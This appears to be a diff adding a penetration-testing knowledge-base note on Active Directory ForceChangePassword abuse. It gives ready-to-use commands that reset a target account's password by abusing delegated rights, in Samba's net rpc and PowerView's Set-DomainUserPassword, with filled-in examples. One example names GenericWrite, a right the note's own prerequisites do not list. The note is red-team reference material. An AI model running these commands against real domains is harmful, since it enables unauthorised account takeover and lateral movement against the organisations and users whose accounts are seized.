@@ -1,0 +1,87 @@
+---
+Primary_category: "[[DACL ABUSE]]"
+title: "FORCECHANGEPASSWORD"
+draft: false
+banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
+banner_y: 0.88286
+tags:
+cssclasses:
+---
+
+###### PRIMARY CATEGORY → [[DACL ABUSE]]
+
+This abuse can be carried out when an operator controls a principal which has **`GenericAll`**, **`AllExtendedRight`** or **`User-Force-Change-Password`** over the target account
+
+---
+
+#### *Abuse - UNIX-like*
+
+##### *Net RPC (Samba Suite)*
+
+> ***[Net RPC](https://www.samba.org/samba/docs/current/man-html/net.8.html)***
+
+```bash
+net rpc password '<TARGET_ACCOUNT>' '<PASSWD>' -U '<DOMAIN>/<USER>%<PASSWD>' -S '<TARGET>'
+```
+
+> [!DANGER]- *e.g.*
+>
+> *UserA* has *GenericWrite* over *UserB*
+>
+> ```bash
+> net rpc password 'userB' 'newpassword1234$!' -U 'domain.local/userA%password1234$!' -S 'DC.domain.local'
+> ```
+>
+
+---
+
+#### *Abuse - Windows*
+
+##### *Powerview*
+
+> ***[Powerview](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)***
+
+> ***Set-DomainUserPassword***
+
+```powershell
+$principalPasswd = ConvertTo-SecureString -AsPlainText -Force -String '<PASSWD>'
+```
+
+```powershell
+$principalCred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $principalPasswd)
+```
+
+```powershell
+$targetPasswd = ConvertTo-SecureString -AsPlainText -Force -String '<PASSWD>'
+```
+
+```powershell
+Set-DomainUserPassword -Credential $principalCred -Identity '<TARGET_ACCOUNT>' -AccountPassword $targetPasswd 
+```
+
+> [!DANGER]- *e.g.*
+>
+> *An operator* discovers that *userA* has the *GenericAll* right over *userB*. Therefore, it proceed as follows in order to change the password of *userB* leveraging that right
+>
+> ```powershell
+> $userAPasswd = ConvertTo-SecureString -AsPlainText -Force -String 'password1234$!'
+> ```
+>
+> ```powershell
+> $userACred = New-Object System.Management.Automation.PSCredential('domain.local\userA', $userAPasswd)
+> ```
+>
+> ```powershell
+> $userBPasswd = ConvertTo-SecureString -AsPlainText -Force -String 'anotherpass1234$!'
+> ```
+>
+> ```powershell
+> Set-DomainUserPassword -Credential $userACred -Identity 'userB' -AccountPassword $userBPasswd
+> ```
+>
+
+---
+
+#### *References*
+
+***[The Hacker Recipes](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword)***
